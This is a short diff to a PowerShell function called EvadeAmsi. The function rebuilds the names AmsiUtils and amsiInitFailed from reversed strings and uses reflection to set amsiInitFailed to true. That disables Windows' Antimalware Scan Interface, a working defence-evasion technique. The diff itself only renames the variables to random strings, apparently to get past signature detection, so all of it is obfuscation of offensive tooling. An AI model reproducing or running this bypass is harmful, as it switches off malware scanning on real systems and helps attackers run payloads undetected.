@@ -7,9 +7,9 @@
 ########################################################
 
 function EvadeAmsi{
-	$string1 = 'slitUismA'
-	$string2 = 'deliaFtinIisma'
-	$rev1 = ([regex]::Matches($String1,'.','RightToLeft') | ForEach {$_.value}) -join ''
-	$rev2 = ([regex]::Matches($String2,'.','RightToLeft') | ForEach {$_.value}) -join ''
-	[Ref].Assembly.GetType('System.Management.Automation.' +$rev1).GetField($rev2,'NonPublic,Static').SetValue($null,$true)
+	$tvkt = 'slitUismA'
+	$rftg = 'deliaFtinIisma'
+	$rdblk = ([regex]::Matches($tvkt,'.','RightToLeft') | ForEach {$_.value}) -join ''
+	$xvtg = ([regex]::Matches($rftg,'.','RightToLeft') | ForEach {$_.value}) -join ''
+	[Ref].Assembly.GetType('System.Management.Automation.' + $rdblk).GetField($xvtg,'NonPublic,Static').SetValue($null,$true)
 }
